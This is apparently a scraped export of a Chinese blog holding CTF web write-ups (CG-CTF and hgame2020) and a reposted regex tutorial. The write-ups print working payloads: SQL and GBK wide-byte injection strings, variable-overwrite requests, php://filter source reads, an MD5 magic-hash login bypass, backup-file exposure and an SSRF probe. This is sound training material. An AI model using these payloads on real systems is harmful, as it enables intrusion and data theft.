?\u003e\u003c/code\u003e\r\u003c/div\u003e\r\u003c?php } ?\u003e\r\u003c?php } ?\u003e\r整理为：\n\u003c?php\rif ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {\rextract($_POST);\rif ($pass == $thepassword_123) {\recho $theflag;\r}\r}\r?\u003e\r 变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract(), parse_str() 和 import_request_variables()  extract()变量覆盖\n extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。  \u003c?php\r$auth = '0';\rextract($_GET)；\rif($auth==1){\recho \"private!\";\r}else{\recho \"public!\";\r}\r?\u003e\r假设用户构造以下链接：http://www.a.com/test1.php?auth=1\n则站点会输出“private！”\n所以playload是：（burp suite数据包）\nPOST /web18/ HTTP/1.1\rHost: chinalover.sinaapp.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 24\rOrigin: http://chinalover.sinaapp.com\rConnection: close\rReferer: http://chinalover.sinaapp.com/web18/index.php\rUpgrade-Insecure-Requests: 1\rpass=1\u0026thepassword_123=1\rnctf{bian_liang_fu_gai!}\n变量覆盖2 考点：遍历初始化变量导致变量覆盖\n题目源码：\n\u003c!--\rforeach($_GET as $key =\u003e $value){ $$key = $value; } if($name == \"meizijiu233\"){\recho $flag;\r}\r--\u003e\r（详见本站“变量覆盖漏洞学习笔记”）\nplayload:\nchinalover.sinaapp.com/web24/?name=meizijiu233\rnctf{AD3FBD8D5928693CA499347C91570AE6}\nSQL Injection 知识点：PHP代码审计，sql语言基础，\\转义单引号\n题目：\n\u003c!--\r#GOAL: login as admin,then get the flag;\rerror_reporting(0);\rrequire 'db.inc.php';\rfunction clean($str){\rif(get_magic_quotes_gpc()){\r$str=stripslashes($str);\r}\rreturn htmlentities($str, ENT_QUOTES);\r}\r$username = @clean((string)$_GET['username']);\r$password = @clean((string)$_GET['password']);\r$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\r$result=mysql_query($query);\rif(!$result || mysql_num_rows($result) \u003c 1){\rdie('Invalid password!');\r}\recho $flag;\r--\u003e\rInvalid password!\r 代码中clean()函数去掉转义，htmlentities($str, ENT_QUOTES)会转换单引号和双引号。这里我们只能通过引入反斜杠，转义原有的单引号，改变原sql语句的逻辑，导致sql注入。  payload如下：\n?username=\\\u0026password= or 1#//要urlcode编码一下，不然#会被浏览器当作空字符\r于是sql查询语句为：\nSELECT * FROM users WHERE\rname='\\' AND pass=' //此时，\\'已被转义为一个字符，不会起到引号的作用\ror 1\r#'\rflag:nctf{sql_injection_is_interesting}\nSQL注入2 考点：union查询，union查询的时候，返回的结果的列名个第一条查询语句是相同的\nSQL UNION 语法 SELECT column_name(s) FROM table_name1\rUNION\rSELECT column_name(s) FROM table_name2\r如果要查询重复的值，可以使用 UNION ALL：\nSELECT column_name(s) FROM table_name1\rUNION ALL\rSELECT column_name(s) FROM table_name2\r实例 列出所有在中国和美国的不同的雇员名：\nSELECT E_Name FROM Employees_China\rUNION\rSELECT E_Name FROM Employees_USA\r结果    E_Name     Zhang, Hua   Wang, Wei   Carter, Thomas   Yang, Ming   Adams, John   Bush, George   Gates, Bill    注意：\n union查询必须和第一句查询语句查询列数相同，不然会出现错误； union查询的时候，返回的结果的列名个第一条查询语句是相同的 union第一条查询失败后会返回第二条的结果，但是列名还是第一条查询的列名  此题正是用到了第三条知识点：\n\u003chtml\u003e\r\u003chead\u003e\rSecure Web Login II\r\u003c/head\u003e\r\u003cbody\u003e\r\u003c?php\rif($_POST[user] \u0026\u0026 $_POST[pass]) {\rmysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\rmysql_select_db(SAE_MYSQL_DB);\r$user = $_POST[user];\r$pass = md5($_POST[pass]);\r$query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));\rif (($query[pw]) \u0026\u0026 (!strcasecmp($pass, $query[pw]))) {\recho \"\u003cp\u003eLogged in! Key: ntcf{**************} \u003c/p\u003e\";\r}\relse {\recho(\"\u003cp\u003eLog in failure!\u003c/p\u003e\");\r}\r}\r?\u003e\r\u003cform method=post action=index.php\u003e\r\u003cinput type=text name=user value=\"Username\"\u003e\r\u003cinput type=password name=pass value=\"Password\"\u003e\r\u003cinput type=submit\u003e\r\u003c/form\u003e\r\u003c/body\u003e\r\u003ca href=\"index.phps\"\u003eSource\u003c/a\u003e\r\u003c/html\u003e\r意思是查询到的pw和输入的pw（经过md5加密后）相同，则输出flag；\nplayload：\nuser=' union select md5(1)#\rpw=1\r查询结果其实是：\n   pw     md5（1）    于是输入pw=1即可满足；\nnctf{union_select_is_wtf}\nGBK Injection 知识点：\n宽字节注入：\n当传入的单引号会被反斜杠转义的时候，一般情况下是不存在sql注入漏洞的，但是有一个特例，那就是数据库的编码为GBK时，可以使用宽字节注入，宽字节的格式是在地址后面先加一个%df，再加单引号，因为反斜杠的编码为%5c，然而再GBK编码中，%df%5c是繁体字“謰”，所以这个时候，单引号就不会被反斜杠转义，造成注入。\n输入%df之后：\n此时已经造成了注入；\n先使用order by语句查询出表中有多少列：\nid=1%df%27+order+by+2%23 //不报错\rid=1%df%27+order+by+3%23 //报错，判断列数为2\r或者使用union查询：\nid=1%df%27+union+select+null,null%23 //不报错\rid=1%df%27+union+select+null,null,null%23 //报错，判断列数为2\r随后可将null换成查询语句，想要union查询到我们自己输入的语句，需要把1换成-1，\n因为单引号被过滤，所以我们可以使用嵌套查询：\n-1%df%27%20union+select+null,(select+table_name+from+information_schema.tables+where+table_schema=(select+database())limit+0,1)%23\r这句可以查到表名，但是只能插一个，想要查到其他的需要更改limit的值\n-1%df%27%20union+select+null,(select+column_name+from+information_schema.columns+where+table_schema=(select+database())+and+table_name=(select+table_name+from+information_schema.tables+where+table_schema=(select+database())+limit+0,1)+limit+1,2)%23\r这句可以查到字段名；\n但是这道题我们不推荐这个嵌套查询的方法。\n有一个系统自带的函数：group_concat()（一般是CTF中常用的）:\nid=-1%df%27%20union+select+null,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23\r直接查到了所有表名；\n虽然单引号被过滤了，我们可以使用16进制绕过的方法：\nid=-1%df%27%20union+select+null,group_concat(column_name)+from+information_schema.columns+where+table_name=0x6e657773%23\r直接查到了news（0x6e657773）表中所有字段名；\n在这之后，可以把union中的null替换为查询语句\nselect 字段名 from 表名\nid=-1%df%27%20union%20select%20null,flag%20from%20ctf4%23\r当然其他的表存在假的flag，这个才是真的；\nflag{this_is_sqli_flag}\nfile_get_contents 知识点：php://input访问POST请求的原始数据的只读流\n访问题目，查看源码：\n\u003c!--$file = $_GET['file'];\rif(@file_get_contents($file) == \"meizijiu\"){\recho $nctf;\r}--\u003e\r这里使用PHP伪协议php://input访问未处理过的POST数据：\nburp suite发包：\nPOST /web23/?file=php://input HTTP/1.1\rHost: chinalover.sinaapp.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rContent-Length: 8\rmeizijiu\r可以直接得到flag：\nnctf{0b021b88527c69e5}\n综合题 考点：JSFuck、命令记录文件.bash_history\n打开题目是一串的JSFuck：\n直接复制到F12里面的控制台运行，得到：\n1bc29b36f623ba82aaf6724fd3b16718.php\r直接访问这个页面：\n这里是一个脑洞，\n其实他说TIP在他脑袋里，其实就是“head”，暗示了HTTP头：\ntip: history of bash\rLinux的 用户目录下三个bash文件的作用: (.bash_history,.bash_logout,.bash_profile,.bashrc)\n这里就只说.bash_history:\n Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。  于是我们访问.bash_history这个文件：\n我们继续访问flagbak.zip，就能直接下载这个文件，解压打开就是flag：\nnctf{bash_history_means_what}\n 密码重置2 考点：Linux下vi编辑器退出后留下的备份文件、弱类型比较\n查看源码中可以找到admin的邮箱，随意舔一个token后提交得到一个提示fail的页面；\n根据题干的提示，这个是用Linux下vi编辑器编辑的；\n 当非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。 需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。 意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。 例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。  参考：https://blog.csdn.net/qq_35405259/article/details/86476663\n于是我们可以去访问\nhttp://nctf.nuptzj.cn/web14/.submit.php.swp //submit前面一定有一个\".\"\r可以得到submit页面的源码，其中关键部分是：\nif(!empty($token)\u0026\u0026!empty($emailAddress)){\rif(strlen($token)!=10) die('fail');\rif($token!='0') die('fail');\r$sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\";\r$r = mysql_query($sql) or die('db error');\r$r = mysql_fetch_assoc($r);\r$r = $r['num'];\rif($r\u003e0){\recho $flag;\r}else{\recho \"失败了呀\";\r}\r}\r第2、3行弱类型比较，我们只需要输入token=0000000000（10个）：\nnctf{thanks_to_cumt_bxs}\n","description":"","tags":["PHP特性"],"title":"CG-CTF_wp","uri":"/posts/cg-ctf_wp/"},{"categories":["note"],"content":"转自：https://www.cnblogs.com/zery/p/3438845.html\n教程：https://www.runoob.com/regexp/regexp-tutorial.html\n一 、前言 　对于正则表达式，相信很多人都知道，但是很多人的第一感觉就是难学，因为看第一眼时，觉得完全没有规律可寻，而且全是一堆各种各样的特殊符号，完全不知所云。\n其实只是对正则不了解而以，了解了你就会发现，原来就这样啊正则所用的相关字符其实不多，也不难记，更不难懂，唯一难的就是组合起来之后，可读性比较差，而且不容易理解，本文旨在让大家对正则有一个基本的了解，能看得懂简单的正则表达式，写得出简单的正则表达式，用以满足日常开发中的需求即可。\n0\\d{2}-\\d{8}|0\\d{3}-\\d{7} 先来一段正则，如果你对正则不了解，是不是完全不知道这一串字符是什么意思？这不要紧文章会详细解释每个字符的含义的。\n1.1 什么是正则表达式\n正则表达式是一种特殊的字符串模式，用于匹配一组字符串，就好比用模具做产品，而正则就是这个模具，定义一种规则去匹配符合规则的字符。\n1.2 常用的正则匹配工具\n在线匹配工具：\n　1 http://www.regexpal.com/\n2 http://rubular.com/\n二 、正则字符简单介绍 2.1 元字符介绍\n\"^\" ：^会匹配行或者字符串的起始位置，有时还会匹配整个文档的起始位置。\n\"$\" ：$会匹配行或字符串的结尾\n如图\n​ 而且被匹配的字符必须是以This开头有空格也不行，必须以Regex结尾，也不能有空格与其它字符\n\"\\b\" :不会消耗任何字符只匹配一个位置，常用于匹配单词边界 如 我想从字符串中\"This is Regex\"匹配单独的单词 \"is\" 正则就要写成 \"\\bis\\b\"\n　\\b 不会匹配is 两边的字符，但它会识别is 两边是否为单词的边界\n\"\\d\": 匹配数字，\n　例如要匹配一个固定格式的电话号码以0开头前4位后7位，如0737-5686123 正则:^0\\d\\d\\d-\\d\\d\\d\\d\\d\\d\\d$ 这里只是为了介绍\"\\d\"字符，实际上有更好的写法会在 下面介绍。\n\"\\w\"：匹配字母，数字，下划线.\n　例如我要匹配\"a2345BCD__TTz\" 正则：\"\\w+\" 这里的\"+\"字符为一个量词指重复的次数，稍后会详细介绍。\n\"\\s\"：匹配空格\n　例如字符 \"a b c\" 正则：\"\\w\\s\\w\\s\\w\" 一个字符后跟一个空格，如有字符间有多个空格直接把\"\\s\" 写成 \"\\s+\" 让空格重复\n\".\"：匹配除了换行符以外的任何字符\n　这个算是\"\\w\"的加强版了\"\\w\"不能匹配 空格 如果把字符串加上空格用\"\\w\"就受限了，看下用 \".\"是如何匹配字符\"a23 4 5 B C D__TTz\" 正则：\".+\"\n\"[abc]\": 字符组 匹配包含括号内元素的字符\n​ 这个比较简单了只匹配括号内存在的字符，还可以写成[a-z]匹配a至z的所以字母就等于可以用来控制只能输入英文了，\n2.2 几种反义\n　写法很简单改成大写就行了，意思与原来的相反，这里就不举例子了\n\"****\\W\" 匹配任意不是字母，数字，下划线 的字符\n\"\\S\" 匹配任意不是空白符的字符\n　\"\\D\" 匹配任意非数字的字符\n\"\\B\" 匹配不是单词开头或结束的位置\n\"[^abc]\" 匹配除了abc以外的任意字符\n2.3 量词\n　先解释关于量词所涉及到的重要的三个概念\n贪婪(贪心) 如\"*\"字符 贪婪量词会首先匹配整个字符串，尝试匹配时，它会选定尽可能多的内容，如果 失败则回退一个字符，然后再次尝试回退的过程就叫做回溯，它会每次回退一个字符，直到找到匹配的内容或者没有字符可以回退。相比下面两种贪婪量词对资源的消耗是最大的，\n懒惰(勉强) 如 \"?\" 懒惰量词使用另一种方式匹配，它从目标的起始位置开始尝试匹配，每次检查一个字符，并寻找它要匹配的内容，如此循环直到字符结尾处。\n占有 如\"+\" 占有量词会覆盖事个目标字符串，然后尝试寻找匹配内容 ，但它只尝试一次，不会回溯，就好比先抓一把石头，然后从石头中挑出黄金\n\"*\"(贪婪) 重复零次或更多\n　例如\"aaaaaaaa\" 匹配字符串中所有的a 正则： \"a*\" 会出到所有的字符\"a\"\n\"+\"(懒惰) 重复一次或更多次\n　例如\"aaaaaaaa\" 匹配字符串中所有的a 正则： \"a+\" 会取到字符中所有的a字符， \"a+\"与\"a*\"不同在于\"+\"至少是一次而\"*\" 可以是0次，\n　稍后会与\"?\"字符结合来体现这种区别\n\"?\"(占有) 重复零次或一次\n　例如\"aaaaaaaa\" 匹配字符串中的a 正则 ： \"a?\" 只会匹配一次，也就是结果只是单个字符a\n　\"{n}\" 重复n次\n　例如从\"aaaaaaaa\" 匹配字符串的a 并重复3次 正则： \"a{3}\" 结果就是取到3个a字符 \"aaa\";\n　\"{n,m}\" 重复n到m次\n　例如正则 \"a{3,4}\" 将a重复匹配3次或者4次 所以供匹配的字符可以是三个\"aaa\"也可以是四个\"aaaa\" 正则都可以匹配到\n\"{n,}\" 重复n次或更多次\n　与{n,m}不同之处就在于匹配的次数将没有上限，但至少要重复n次 如 正则\"a{3,}\" a至少要重复3次\n把量词了解了之后之前匹配电话号码的正则现在就可以改得简单点了^0\\d\\d\\d-\\d\\d\\d\\d\\d\\d\\d$ 可以改为\"^0\\d+-\\d{7}$\"。\n这样写还不够完美如果因为前面的区号没有做限定，以至于可以输入很多们，而通常只能是3位或者4位，\n现在再改一下 \"^0\\d{2,3}-\\d{7}\"如此一来区号部分就可以匹配3位或者4位的了\n2.4 懒惰限定符\n　\"*?\" 重复任意次，但尽可能少重复\n　如 \"acbacb\" 正则 \"a.*?b\" 只会取到第一个\"acb\" 原本可以全部取到但加了限定符后，只会匹配尽可能少的字符 ，而\"acbacb\"最少字符的结果就是\"acb\"\n　\"+?\" 重复1次或更多次，但尽可能少重复\n　与上面一样，只是至少要重复1次\n　\"??\" 重复0次或1次，但尽可能少重复\n　如 \"aaacb\" 正则 \"a.??b\" 只会取到最后的三个字符\"acb\"\n　\"{n,m}?\" 重复n到m次，但尽可能少重复\n​ 如 \"aaaaaaaa\" 正则 \"a{0,m}\" 因为最少是0次所以取到结果为空\n　\"{n,}?\" 重复n次以上，但尽可能少重复\n​ 如 \"aaaaaaa\" 正则 \"a{1,}\" 最少是1次所以取到结果为 \"a\"\n修饰符： i ：如果在修饰符中加上\"i\"，则正则将会取消大小写敏感性，即\"a\"和\"A\" 是一样的。 m：默认的正则开始\"^\"和结束\"$\"只是对于正则字符串如果在修饰符中加上\"m\"，那么开始和结束将会指字符串的每一行：每一行的开头就是\"^\"，结尾就是\"$\"。 s：如果在修饰符中加入\"s\"，那么默认的\".\"代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！ x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。 e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。 A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说\"/a/A\"匹配\"abcd\"。 E：与\"m\"相反，如果使用这个修饰符，那么\"$\"将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。 U：和问号的作用差不多，用于设置\"贪婪模式\"。\n正则表达式中常用的模式修正符有i、g、m、s、x、e等。它们之间可以组合搭配使用。\n它们的作用如下：\n//修正符:i 不区分大小写的匹配;\n//如:\"/abc/i\"可以与abc或aBC或ABc等匹配;\n//修正符：g表示全局匹配\n//修正符:m 将字符串视为多行,不管是那行都能匹配;\n例://模式为:$mode=\"/abc/m\"; //要匹配的字符串为:$str=\"bcefg5e\\nabcdfe\" //注意其中\\n,换行了;abc换到了下一行; //$str和$mode仍可以匹配,修正符m使得多行也可匹配; //修正符:s 将字符串视为单行,换行符作为普通字符;\n例://模式为:$mode=\"/pr.y/\"; //要匹配字符串为:$str=\"pr\\ny\"; //两者不可匹配; . 是除了换行以外的字符可匹配; //修改下模式为:$mode=\"/pr.y/s\"; //其中修正符s将\\n视为普通字符,即不是换行; //最后两者可以匹配; //修正符:x 将模式中的空白忽略; //修正符:A 强制从目标字符串开头匹配;\n例://$mode=\"/abc/A\"; //可以与$str=\"abcsdfi\"匹配, //不可以与$str2=\"sdsdabc\"匹配; //因为$str2不是以abc开头; //修正符:D 如果使用$限制结尾字符,则不允许结尾有换行;\n例://模式为:$mode=\"/abc$/\"; //可以与最后有换行的$str=\"adshabc\\n\"匹配; //元子符$会忽略最后的换行\\n; //如果模式为:$mode=\"/abc/D\", //则不能与$str=\"adshabc\\n\"匹配, //修正符D限制其不可有换行;必需以abc结尾; //修正符:U 只匹配最近的一个字符串;不重复匹配;\n例: 如模式为: $mode=\"/a.*c/\"; $str=\"abcabbbcabbbbbc\" ; preg_match($mode,$str,$content); echo $content[0]; //输出:abcabbbcabbbbbc;\n//如果$mode=\"/a.*c/\";变成$mode=\"/a.*c/U\"; // 则只匹配最近一个字符串,输出:abc;\n//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;\n三 、 正则进阶 3.1 捕获分组\n　先了解在正则中捕获分组的概念，其实就是一个括号内的内容 如 \"(\\d)\\d\" 而\"(\\d)\" 这就是一个捕获分组，可以对捕获分组进行 后向引用 (如果后而有相同的内容则可以直接引用前面定义的捕获组，以简化表达式) 如(\\d)\\d\\1 这里的\"\\1\"就是对\"(\\d)\"的后向引用\n那捕获分组有什么用呢看个例子就知道了\n如 \"zery zery\" 正则 \\b(\\w+)\\b\\s\\1\\b 所以这里的\"\\1\"所捕获到的字符也是 与(\\w+)一样的\"zery\"，为了让组名更有意义，组名是可以自定义名字的\n\"\\b(?\\w+)\\b\\s\\k\\b\" 用\"?\"就可以自定义组名了而要后向引用组时要记得写成 \"\\k\";自定义组名后,捕获组中匹配到的值就会保存在定义的组名里\n下面列出捕获分组常有的用法\n\"(exp)\" 匹配exp,并捕获文本到自动命名的组里\n\"(?exp)\" 匹配exp,并捕获文本到名称为name的组里\n\"(?:exp)\" 匹配exp,不捕获匹配的文本，也不给此分组分配组号\n以下为零宽断言\n\"(?=exp)\" 匹配exp前面的位置\n　如 \"How are you doing\" 正则\"(?.+(?=ing))\" 这里取ing前所有的字符，并定义了一个捕获分组名字为 \"txt\" 而\"txt\"这个组里的值为\"How are you do\";\n\"(?\u003c=exp)\" 匹配exp后面的位置\n　如 \"How are you doing\" 正则\"(?(?\u003c=How).+)\" 这里取\"How\"之后所有的字符，并定义了一个捕获分组名字为 \"txt\" 而\"txt\"这个组里的值为\" are you doing\";\n\"(?!exp)\" 匹配后面跟的不是exp的位置\n　如 \"123abc\" 正则 \"\\d{3}(?!\\d)\"匹配3位数字后非数字的结果\n\"(?\u003c!exp)\" 匹配前面不是exp的位置\n　如 \"abc123 \" 正则 \"(?\u003c![0-9])123\" 匹配\"123\"前面是非数字的结果也可写成\"(?!\u003c\\d)123\"\n","description":"转载，自用","tags":["正则"],"title":"正则表达式学习笔记","uri":"/posts/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["ctf_writeup"],"content":"hgame2020是我第一次参加的个人赛；\n官方wp：https://github.com/vidar-team/Hgame2020_writeup\nbyc_404师傅的wp：https://www.jianshu.com/p/5bb6ecd67293\nlevel-week 1  web2_接头霸王 这道题起初没有明白接头霸王是什么意思，后来做完之后才发现这个“头”指的是HTTP请求头；（灰兔子脸\n走流程，抓包：\n\"You need to come from https://vidar.club\"，也就是修改http头里面的referer：\n继续看：\"You need to visit it locally\",显然是XFF头：\nx-forwarded-for: 127.0.0.1\r\"the flag will be update after 2077,please wait for patiently\",显然不可能等到2077年，于是修改：\nif-unmodified-since: Wed, 21 Oct 2077 07:28:00 GMT\r(只要是2077年之后都行)\n HTTP协议中的 If-Unmodified-Since 消息头用于请求之中，使得当前请求成为条件式请求：只有当资源在指定的时间之后没有进行过修改的情况下，服务器才会返回请求的资源，或是接受 POST 或其他 non-safe 方法的请求。如果所请求的资源在指定的时间之后发生了修改，那么会返回 412 (Precondition Failed) 错误。  拿到flag；\nweb3_codewolrd 点进去是一个403页面，f12，看源码，发现\u003cscript\u003e里面有一行提示：\nThis new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!\n应该是302跳转；\n 当我们用浏览器去访问时，浏览器会自动重定向到指定的页面，而此页面并不是我们想要的含有flag的页面，通过抓包可以看到页面被重定向。因此，我们应该想办法让页面不重定向，这样就可以拿到flag了  于是，我就想到了 curl 这个命令，该命令只有在加参数 -L 的情况下才会重定向。\nWindows下curl的安装以及解决中文乱码：https://segmentfault.com/a/1190000015115481\niconv是另一个工具，iconv -f utf-8 -t gbk是解决乱码：\n继续试：\n看到显示的人鸡验证，知道肯定有东西（滑稽，然后这里卡了一下午，知道第二天看到题目描述才懂：\n然后是明白url里面+号需要编码：+ ——\u003e %2b ；直接用+号表示空格；\n使用burp suite同样可以做，只不过要抓跳转之前的包：\n拿到flag；\nweb4_ji你太玫 本题没有发现什么正常思路（可能是我太菜了）点进去一个页面，叫你玩游戏：\n游戏不难，通关之后，没有任何反应，所以重开故意死一次：\n3w分是不可能的，因为就算不死，每一关分数清零；然后就去burp里面看，找到一个比较可疑的history（因为是POST）：\n点进去，http请求体里面有个键名叫score，恍然大悟：\nflag入手；\nweek1题目结束；\nlevel-week 2  web1_Cosmos的博客后台 点开题目：\n在burpsuite里面可以看到两个包，一个是从index.php重定向过来的，一个是login.php；\n由参数 'action=' 联想到文件包含漏洞（文件包含漏洞学习笔记），于是尝试使用几个PHP伪协议来读取页面的源码；\n这里附上几个协议的用法：\nplayload：\nhttp://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=index.php\rhttp://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php\r可以得到两个页面的（base64加密过后的）源码；\nlogin.php:\n\u003c?php\rinclude \"config.php\";\rsession_start();\r//Only for debug\rif (DEBUG_MODE){\rif(isset($_GET['debug'])) {\r$debug = $_GET['debug'];\rif (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) { die(\"args error!\");\r}\reval(\"var_dump($$debug);\");\r}\r}\rif(isset($_SESSION['username'])) {\rheader(\"Location: admin.php\");\rexit();\r}\relse {\rif (isset($_POST['username']) \u0026\u0026 isset($_POST['password'])) {\rif ($admin_password == md5($_POST['password']) \u0026\u0026 $_POST['username'] === $admin_username){\r$_SESSION['username'] = $_POST['username'];\rheader(\"Location: admin.php\");\rexit();\r}\relse {\recho \"用户名或密码错误\";\r}\r}\r}\r?\u003e\r\u003c!DOCTYPE html\u003e\r\u003chtml lang=\"zh-CN\"\u003e\r\u003chead\u003e\r\u003cmeta charset=\"utf-8\"\u003e\r\u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e\r\u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\r\u003cmeta name=\"description\" content=\"\"\u003e\r\u003cmeta name=\"author\" content=\"\"\u003e\r\u003ctitle\u003eCosmos的博客后台\u003c/title\u003e\r\u003clink href=\"static/signin.css\" rel=\"stylesheet\"\u003e\r\u003clink href=\"static/sticky-footer.css\" rel=\"stylesheet\"\u003e\r\u003clink href=\"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\"\u003e\r\u003c/head\u003e\r\u003cbody\u003e\r\u003cdiv class=\"container\"\u003e\r\u003cform class=\"form-signin\" method=\"post\" action=\"login.php\"\u003e\r\u003ch2 class=\"form-signin-heading\"\u003e后台登陆\u003c/h2\u003e\r\u003cinput type=\"text\" name=\"username\" class=\"form-control\" placeholder=\"用户名\" required autofocus\u003e\r\u003cinput type=\"password\" name=\"password\" class=\"form-control\" placeholder=\"密码\" required\u003e\r\u003cinput class=\"btn btn-lg btn-primary btn-block\" type=\"submit\" value=\"Submit\"\u003e\r\u003c/form\u003e\r\u003c/div\u003e\r\u003cfooter class=\"footer\"\u003e\r\u003ccenter\u003e\r\u003cdiv class=\"container\"\u003e\r\u003cp class=\"text-muted\"\u003eCreated by Annevi\u003c/p\u003e\r\u003c/div\u003e\r\u003c/center\u003e\r\u003c/footer\u003e\r\u003c/body\u003e\r\u003c/html\u003e\rindex.php:\n\u003c?php\rerror_reporting(0);\rsession_start();\rif(isset($_SESSION['username'])) {\rheader(\"Location: admin.php\");\rexit();\r}\r$action = @$_GET['action'];\r$filter = \"/config|etc|flag/i\";\rif (isset($_GET['action']) \u0026\u0026 !empty($_GET['action'])) {\rif(preg_match($filter, $_GET['action'])) {\recho \"Hacker get out!\";\rexit();\r}\rinclude $action;\r}\relseif(!isset($_GET['action']) || empty($_GET['action'])) {\rheader(\"Location: ?action=login.php\");\rexit();\r}\r过滤了flag关键字，看来不能直接文件包含读flag\n继续看，login.php里面的debug：\n（PHP中的魔术变量）意思是GET过去的debug等于什么名字就输出什么名字的变量\n就很nice：\nhttp://cosmos-admin.hgame.day-day.work/login.php?action=login.php\u0026debug=admin_username\rhttp://cosmos-admin.hgame.day-day.work/login.php?action=login.php\u0026debug=admin_password\r可以分别得到：\n用户名：Cosmos!\n密码：（md5加密后）0e114902927253523756713132279690\n然后密码又是弱类型判断（常见MD5碰撞的playload）；\n于是输入密码 ：\nQNKCDZO\r登录成功：\n看样子只有插入图片的地方能搞事；\nXSS不能读取服务器文件，那就SSRF：\nfile:///flag\r试一下，不行；\n文件包含读取admin.php:\nhttp://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=admin.php\radmin.php:\n\u003c?php\rinclude \"config.php\";\rsession_start();\rif(!isset($_SESSION['username'])) {\rheader('Location: index.php');\rexit();\r}\rfunction insert_img() {\rif (isset($_POST['img_url'])) {\r$img_url = @$_POST['img_url'];\r$url_array = parse_url($img_url);\rif (@$url_array['host'] !== \"localhost\" \u0026\u0026 $url_array['host'] !== \"timgsa.baidu.com\") {\rreturn false;\r} $c = curl_init();\rcurl_setopt($c, CURLOPT_URL, $img_url);\rcurl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\r$res = curl_exec($c);\rcurl_close($c);\r$avatar = base64_encode($res);\rif(filter_var($img_url, FILTER_VALIDATE_URL)) {\rreturn $avatar;\r}\r}\relse {\rreturn base64_encode(file_get_contents(\"static/logo.png\"));\r}\r}\r?\u003e\r\u003chtml\u003e\r\u003chead\u003e\r\u003ctitle\u003eCosmos’ Blog - 后台管理\u003c/title\u003e\r\u003c/head\u003e\r\u003cbody\u003e\r\u003ca href=\"logout.php\"\u003e退出登陆\u003c/a\u003e\r\u003cdiv style=\"text-align: center;\"\u003e\r\u003ch1\u003eWelcome \u003c?php echo $_SESSION['username'];?\u003e \u003c/h1\u003e\r\u003c/div\u003e\r\u003cform action=\"\" method=\"post\"\u003e\r\u003cfieldset style=\"width: 30%;height: 20%;float:left\"\u003e\r\u003clegend\u003e插入图片\u003c/legend\u003e\r\u003cp\u003e\u003clabel\u003e图片url: \u003cinput type=\"text\" name=\"img_url\" placeholder=\"\"\u003e\u003c/label\u003e\u003c/p\u003e\r\u003cp\u003e\u003cbutton type=\"submit\" name=\"submit\"\u003e插入\u003c/button\u003e\u003c/p\u003e\r\u003c/fieldset\u003e\r\u003c/form\u003e\r\u003cfieldset style=\"width: 30%;height: 20%;float:left\"\u003e\r\u003clegend\u003e评论管理\u003c/legend\u003e\r\u003ch2\u003e待开发..\u003c/h2\u003e\r\u003c/fieldset\u003e\r\u003cfieldset style=\"width: 30%;height: 20%;\"\u003e\r\u003clegend\u003e文章列表\u003c/legend\u003e\r\u003ch2\u003e待开发..\u003c/h2\u003e\r\u003c/fieldset\u003e\r\u003cfieldset style=\"height: 50%\"\u003e\r\u003cdiv style=\"text-align: center;\"\u003e\r\u003cimg height='200' width='500' src='data:image/jpeg;base64,\u003c?php echo insert_img() ? insert_img() : 